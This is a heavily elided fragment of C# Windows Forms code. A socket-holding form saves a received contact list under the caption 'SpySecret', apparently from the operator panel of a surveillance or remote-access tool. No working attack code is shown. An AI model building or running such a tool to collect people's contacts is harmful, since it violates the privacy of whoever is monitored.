...
namespace SV
{
    public partial class Adress : MetroFramework.Forms.MetroForm
    {
        Socket sco; public string ID = "";
        public Adress(Socket sck, string aydi)
        {
            InitializeComponent();
            ID = aydi; sco = sck;
        }
            ...
            })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        ...
                        MessageBox.Show("Contact list succesfully saved.", "SpySecret", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Contact list couldn't saved:\n" + ex.Message, "SpySecret ", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }
                }
            }
        }
